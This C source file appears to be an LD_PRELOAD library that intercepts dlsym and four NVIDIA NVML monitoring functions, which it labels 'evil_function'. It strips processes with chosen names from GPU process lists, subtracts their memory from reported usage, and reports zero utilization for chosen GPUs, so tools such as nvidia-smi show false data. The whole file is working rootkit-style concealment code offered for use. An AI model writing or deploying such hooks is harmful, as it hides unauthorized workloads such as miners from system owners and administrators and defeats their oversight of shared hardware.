#define _GNU_SOURCE
#define __USE_GNU

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <string.h>
#include "config.h"

#define DECLDIR

typedef enum nvmlReturn_enum {
  // cppcheck-suppress *
  NVML_SUCCESS = 0,                        //!< The operation was successful
  NVML_ERROR_UNINITIALIZED = 1,            //!< NVML was not first initialized with nvmlInit()
  NVML_ERROR_INVALID_ARGUMENT = 2,         //!< A supplied argument is invalid
  NVML_ERROR_NOT_SUPPORTED =
  3,            //!< The requested operation is not available on target device
  NVML_ERROR_NO_PERMISSION =
  4,            //!< The current user does not have permission for operation
  NVML_ERROR_ALREADY_INITIALIZED =
  5,      //!< Deprecated: Multiple initializations are now allowed through ref counting
  NVML_ERROR_NOT_FOUND = 6,                //!< A query to find an object was unsuccessful
  NVML_ERROR_INSUFFICIENT_SIZE = 7,        //!< An input argument is not large enough
  NVML_ERROR_INSUFFICIENT_POWER =
  8,       //!< A device's external power cables are not properly attached
  NVML_ERROR_DRIVER_NOT_LOADED = 9,        //!< NVIDIA driver is not loaded
  NVML_ERROR_TIMEOUT = 10,                 //!< User provided timeout passed
  NVML_ERROR_IRQ_ISSUE = 11,               //!< NVIDIA Kernel detected an interrupt issue with a GPU
  NVML_ERROR_LIBRARY_NOT_FOUND = 12,       //!< NVML Shared Library couldn't be found or loaded
  NVML_ERROR_FUNCTION_NOT_FOUND =
  13,      //!< Local version of NVML doesn't implement this function
  NVML_ERROR_CORRUPTED_INFOROM = 14,       //!< infoROM is corrupted
  NVML_ERROR_GPU_IS_LOST =
  15,             //!< The GPU has fallen off the bus or has otherwise become inaccessible
  NVML_ERROR_RESET_REQUIRED = 16,          //!< The GPU requires a reset before it can be used again
  NVML_ERROR_OPERATING_SYSTEM =
  17,        //!< The GPU control device has been blocked by the operating system/cgroups
  NVML_ERROR_LIB_RM_VERSION_MISMATCH = 18, //!< RM detects a driver/library version mismatch
  NVML_ERROR_IN_USE =
  19,                  //!< An operation cannot be performed because the GPU is currently in use
  NVML_ERROR_MEMORY = 20,                  //!< Insufficient memory
  NVML_ERROR_NO_DATA = 21,                 //!< No data
  NVML_ERROR_VGPU_ECC_NOT_SUPPORTED =
  22,  //!< The requested vgpu operation is not available on target device, becasue ECC is enabled
  NVML_ERROR_INSUFFICIENT_RESOURCES = 23,  //!< Ran out of critical resources, other than memory
  NVML_ERROR_UNKNOWN = 999                 //!< An internal driver error occurred
} nvmlReturn_t;

typedef struct nvmlDevice_st *nvmlDevice_t;

typedef struct nvmlProcessInfo_st {
  unsigned int pid;                //!< Process ID
  unsigned long long usedGpuMemory;      //!< Amount of used GPU memory in bytes.
  //! Under WDDM, \ref NVML_VALUE_NOT_AVAILABLE is always reported
  //! because Windows KMD manages all the memory and not the NVIDIA driver
  unsigned int
	  gpuInstanceId;      //!< If MIG is enabled, stores a valid GPU instance ID. gpuInstanceId is set to
  //  0xFFFFFFFF otherwise.
  unsigned int
	  computeInstanceId;  //!< If MIG is enabled, stores a valid compute instance ID. computeInstanceId is set to
  //  0xFFFFFFFF otherwise.
} nvmlProcessInfo_t;

nvmlReturn_t DECLDIR nvmlDeviceGetComputeRunningProcesses_v2(nvmlDevice_t device,
															 unsigned int *infoCount,
															 nvmlProcessInfo_t *infos) {

  void *handle;
  char *error;
  handle = dlopen("libnvidia-ml.so", RTLD_LAZY);
  if ((error = dlerror()) != NULL) {
	puts(error);
	exit(-1);
  }

  nvmlReturn_t (*realopen)(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos);
  realopen = __libc_dlsym(handle, "nvmlDeviceGetComputeRunningProcesses_v2");

  nvmlReturn_t (*realpn)(unsigned int pid, char *name, unsigned int length);
  realpn = __libc_dlsym(handle, "nvmlSystemGetProcessName");

  nvmlReturn_t r = realopen(device, infoCount, infos);
  if (r != NVML_SUCCESS) {
	return r;
  }

  {
	int hide = 0;
	nvmlReturn_t (*realIndex)(nvmlDevice_t device1, unsigned int *index);
	realIndex = __libc_dlsym(handle, "nvmlDeviceGetIndex");
	unsigned int index = -1;
	nvmlReturn_t ridx = realIndex(device, &index);
	if (ridx != NVML_SUCCESS) {
	  return ridx;
	}
	for (int i = 0;
		 sizeof(hide_GPU_Index) != 0 && i < sizeof(hide_GPU_Index) / sizeof(hide_GPU_Index[0]);
		 i++) {
	  if (index == hide_GPU_Index[i])hide = 1;
	}
	if (!hide)return NVML_SUCCESS;
  }

  int count = 0;
  while (count < *infoCount) {
	uint pid = (infos + count)->pid;

	char *proc_name[128];
	{
	  nvmlReturn_t n = realpn(pid, proc_name, 128);
	  if (n != 0) {
		return NVML_ERROR_UNKNOWN;
	  }
	}
	for (int i = 0; i < sizeof(hide_process_name) / sizeof(hide_process_name[0]); i++) {
	  if (strstr(proc_name, hide_process_name[i]) != NULL) {
		memcpy(infos + count,
			   infos + count + 1,
			   sizeof(nvmlProcessInfo_t) * (*infoCount - count - 1));
		(*infoCount)--;
		count--;
		break;
	  }
	}
	count++;
  }

  dlclose(handle);
  return NVML_SUCCESS;

}

typedef struct nvmlMemory_st {
  unsigned long long total;        //!< Total installed FB memory (in bytes)
  unsigned long long free;         //!< Unallocated FB memory (in bytes)
  unsigned long long
	  used;         //!< Allocated FB memory (in bytes). Note that the driver/GPU always sets aside a small amount of memory for bookkeeping
} nvmlMemory_t;

nvmlReturn_t DECLDIR nvmlDeviceGetMemoryInfo(nvmlDevice_t device, nvmlMemory_t *memory) {
  void *handle;
  char *error;
  handle = dlopen("libnvidia-ml.so", RTLD_LAZY);
  if ((error = dlerror()) != NULL) {
	puts(error);
	exit(-1);
  }
  nvmlReturn_t (*realinfo )(nvmlDevice_t device, nvmlMemory_t *memory);
  realinfo = __libc_dlsym(handle, "nvmlDeviceGetMemoryInfo");

  nvmlReturn_t r1 = realinfo(device, memory);
  if (r1 != NVML_SUCCESS) {
	return r1;
  }
  const char *twoTypes[] =
	  {"nvmlDeviceGetGraphicsRunningProcesses_v2", "nvmlDeviceGetComputeRunningProcesses_v2"};
  for (int i = 0; i < 2; i++) {
	nvmlReturn_t (*realopen)(nvmlDevice_t device,
							 unsigned int *infoCount,
							 nvmlProcessInfo_t *infos);
	realopen = __libc_dlsym(handle, twoTypes[i]);

	nvmlReturn_t (*realpn)(unsigned int pid, char *name, unsigned int length);
	realpn = __libc_dlsym(handle, "nvmlSystemGetProcessName");

	unsigned int _infocGraph = 250;
	unsigned int *infoCountGraph = &_infocGraph;

	nvmlProcessInfo_t *infos = calloc(250, sizeof(nvmlProcessInfo_t));
	nvmlReturn_t r = realopen(device, infoCountGraph, infos);
	if (r != NVML_SUCCESS) {
	  return r;
	}

	{
	  int hide = 0;
	  nvmlReturn_t (*realIndex)(nvmlDevice_t device1, unsigned int *index);
	  realIndex = __libc_dlsym(handle, "nvmlDeviceGetIndex");
	  unsigned int index = -1;
	  nvmlReturn_t ridx = realIndex(device, &index);
	  if (ridx != NVML_SUCCESS) {
		return ridx;
	  }
	  for (int i = 0;
		   sizeof(hide_GPU_Index) != 0 && i < sizeof(hide_GPU_Index) / sizeof(hide_GPU_Index[0]);
		   i++) {
		if (index == hide_GPU_Index[i])hide = 1;
	  }
	  if (!hide)return NVML_SUCCESS;
	}

	int count = 0;
	while (count < *infoCountGraph) {
	  uint pid = (infos + count)->pid;

	  char *proc_name[128];
	  {
		nvmlReturn_t n = realpn(pid, proc_name, 128);
		if (n != 0) {
		  return NVML_ERROR_UNKNOWN;
		}
	  }

	  for (int i = 0; i < sizeof(hide_process_name) / sizeof(hide_process_name[0]); i++) {
		if (strstr(proc_name, hide_process_name[i]) != NULL) {
		  memory->free += (infos + count)->usedGpuMemory;
		  memory->used -= (infos + count)->usedGpuMemory;
		  break;
		}
	  }
	  count++;
	}
  }

  dlclose(handle);
  return NVML_SUCCESS;
}

/**
 * Utilization information for a device.
 * Each sample period may be between 1 second and 1/6 second, depending on the product being queried.
 */
typedef struct nvmlUtilization_st {
  unsigned int
	  gpu;                //!< Percent of time over the past sample period during which one or more kernels was executing on the GPU
  unsigned int
	  memory;             //!< Percent of time over the past sample period during which global (device) memory was being read or written
} nvmlUtilization_t;
nvmlReturn_t DECLDIR nvmlDeviceGetUtilizationRates(nvmlDevice_t device,
												   nvmlUtilization_t *utilization) {

  void *handle;
  char *error;
  handle = dlopen("libnvidia-ml.so", RTLD_LAZY);
  if ((error = dlerror()) != NULL) {
	puts(error);
	exit(-1);
  }
  {
	nvmlReturn_t (*realIndex)(nvmlDevice_t device1, unsigned int *index);
	realIndex = __libc_dlsym(handle, "nvmlDeviceGetIndex");
	unsigned int index = -1;
	nvmlReturn_t ridx = realIndex(device, &index);
	if (ridx != NVML_SUCCESS) {
	  return ridx;
	}
	for (int i = 0;
		 sizeof(hide_GPU_Index) != 0 && i < sizeof(hide_GPU_Index) / sizeof(hide_GPU_Index[0]);
		 i++) {
	  if (index == hide_GPU_Index[i]) {
		utilization->memory = 0;
		utilization->gpu = 0;
		return NVML_SUCCESS;
	  }
	}
  }

  nvmlReturn_t (*getRates)(nvmlDevice_t device, nvmlUtilization_t *utilization);
  getRates = __libc_dlsym(handle, "nvmlDeviceGetUtilizationRates");
  return getRates(device, utilization);
}

nvmlReturn_t DECLDIR nvmlDeviceGetGraphicsRunningProcesses_v2(nvmlDevice_t device,
															  unsigned int *infoCount,
															  nvmlProcessInfo_t *infos) {

  void *handle;
  char *error;
  handle = dlopen("libnvidia-ml.so", RTLD_LAZY);
  if ((error = dlerror()) != NULL) {
	puts(error);
	exit(-1);
  }

  nvmlReturn_t (*realopen)(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos);
  realopen = __libc_dlsym(handle, "nvmlDeviceGetGraphicsRunningProcesses_v2");

  nvmlReturn_t (*realpn)(unsigned int pid, char *name, unsigned int length);
  realpn = __libc_dlsym(handle, "nvmlSystemGetProcessName");

  nvmlReturn_t r = realopen(device, infoCount, infos);
  if (r != NVML_SUCCESS) {
	return r;
  }

  {
	int hide = 0;
	nvmlReturn_t (*realIndex)(nvmlDevice_t device1, unsigned int *index);
	realIndex = __libc_dlsym(handle, "nvmlDeviceGetIndex");
	unsigned int index = -1;
	nvmlReturn_t ridx = realIndex(device, &index);
	if (ridx != NVML_SUCCESS) {
	  return ridx;
	}
	for (int i = 0;
		 sizeof(hide_GPU_Index) != 0 && i < sizeof(hide_GPU_Index) / sizeof(hide_GPU_Index[0]);
		 i++) {
	  if (index == hide_GPU_Index[i])hide = 1;
	}
	if (!hide)return NVML_SUCCESS;
  }

  int count = 0;
  while (count < *infoCount) {
	uint pid = (infos + count)->pid;

	char *proc_name[128];
	{
	  nvmlReturn_t n = realpn(pid, proc_name, 128);
	  if (n != 0) {
		return NVML_ERROR_UNKNOWN;
	  }
	}

	for (int i = 0; i < sizeof(hide_process_name) / sizeof(hide_process_name[0]); i++) {
	  if (strstr(proc_name, hide_process_name[i]) != NULL) {
		memcpy(infos + count,
			   infos + count + 1,
			   sizeof(nvmlProcessInfo_t) * (*infoCount - count - 1));
		(*infoCount)--;
		count--;
		break;
	  }
	}
	count++;
  }

  dlclose(handle);
  return NVML_SUCCESS;
}

const char *evil_function1 = "nvmlDeviceGetComputeRunningProcesses_v2";
const char *evil_function2 = "nvmlDeviceGetGraphicsRunningProcesses_v2";
const char *evil_function3 = "nvmlDeviceGetMemoryInfo";
const char *evil_function4 = "nvmlDeviceGetUtilizationRates";

extern void *_dl_sym(void *, const char *, void *);
extern void *dlsym(void *handle, const char *name) {
  static void *(*real_dlsym)(void *, const char *) =NULL;
  if (real_dlsym == NULL) real_dlsym = _dl_sym(RTLD_NEXT, "dlsym", dlsym);
  /* my target binary is even asking for dlsym() via dlsym()... */
  if (!strcmp(name, "dlsym"))
	return (void *) dlsym;

  if (strcmp(name, evil_function1) == 0) {
	void *result = nvmlDeviceGetComputeRunningProcesses_v2;
	return result;
  } else if (strcmp(name, evil_function2) == 0) {
	void *result = nvmlDeviceGetGraphicsRunningProcesses_v2;
	return result;
  } else if (strcmp(name, evil_function3) == 0) {
	void *result = nvmlDeviceGetMemoryInfo;
	return result;
  } else if (strcmp(name, evil_function4) == 0) {
	void *result = nvmlDeviceGetUtilizationRates;
	return result;
  }
  return real_dlsym(handle, name);
}